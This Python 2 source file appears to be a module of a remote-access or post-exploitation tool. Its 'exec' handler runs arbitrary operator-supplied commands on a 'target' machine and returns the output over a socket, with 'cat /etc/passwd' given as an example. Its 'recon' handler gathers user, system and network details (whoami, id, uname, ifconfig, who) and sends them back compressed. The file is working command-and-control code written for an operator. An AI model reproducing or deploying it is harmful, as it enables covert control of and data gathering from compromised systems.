import module
import config as CFG

import re
import zlib

REGEX = re.compile('^exec(\s+-o(\s+[\w.]+)?)?\s+(("[^"]+")\s+)+$')
EXEC = 'exec'
RECON = 'recon'
USAGE = """Execute commands on target.
usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]
\nExecute given commands and optionally log to file with optional filename.
\noptions:
-h\t\tshow help
-o filename\twrite results to file in {}/'.""".format(CFG.ARCHIVE_DIR)


@module.server_handler(EXEC)
def server_exec(server, argv):
    # extra space is for regex
    if len(argv) < 2 or argv[1] in ('-h', '--help') or not REGEX.match(' '.join(argv) + ' '):
        print USAGE
        return
    try:
        preproc = preprocess(argv)
    except Exception:
        print USAGE
        return
    server.generic(*preproc)


@module.client_handler(EXEC)
def client_exec(client, inp):
    """Handle server `exec' command.

    Execute specially formatted input string and return specially formatted
    response.
    """

    client.s.send(execute(client, ' '.join(inp.split()[1:])))


@module.server_handler(RECON)
def server_recon(server, argv):
    if '-h' in argv or '--help' in argv:
        print USAGE
        return

    argc = len(argv)

    if argc == 1:
        server.generic(RECON)
    elif '-o' in argv:
        if argc == 2:
            server.generic(RECON, True)
        elif argc == 3:
            server.generic(RECON, True, argv[2])
        else:
            print USAGE
    else:
        print USAGE


@module.client_handler(RECON)
def client_recon(client, inp):
    ipcmd = 'ip addr' if 'no' in client.cmd_exec('which ifconfig') else 'ifconfig'
    exec_str = '"whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
    client.s.send(zlib.compress(execute(client, exec_str)))


def execute(client, exec_str):
    out = ''
    cmds = parse_exec_cmds(exec_str)
    for cmd in cmds:
        cmd_out = client.cmd_exec(cmd)
        out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
    return out


def preprocess(argv):
    """Parse posh `exec' command line.

    Args:
        inp: raw `exec' command line

    Returns:
        Tuple suitable for expansion into as self.generic() parameters.
    """

    write_file = None
    write_flag = argv[1] == '-o'
    if write_flag:
        if len(argv) == 2:
            # it was just "exec -o"
            raise Exception
        if '"' not in argv[2]:
            write_file = argv[2]
            del argv[2]
        del argv[1]
    argv = ' '.join(argv)
    return argv, write_flag, write_file


def parse_exec_cmds(inp):
    """Parse string provided by server `exec' command.

    Convert space delimited string with commands to execute in quotes, for
    example ("ls -l" "cat /etc/passwd") into list with commands as strings.

    Returns:
        List of commands to execute.
    """

    if inp.count('"') == 2:
        return [inp[1:-1]]
    else:
        # server side regex guarantees that these quotes will be in the
        # correct place -- the space between two commands
        third_quote = inp.find('" "') + 2
        first_cmd = inp[:third_quote-1]
        rest = inp[third_quote:]
        return [first_cmd[1:-1]] + parse_exec_cmds(rest)
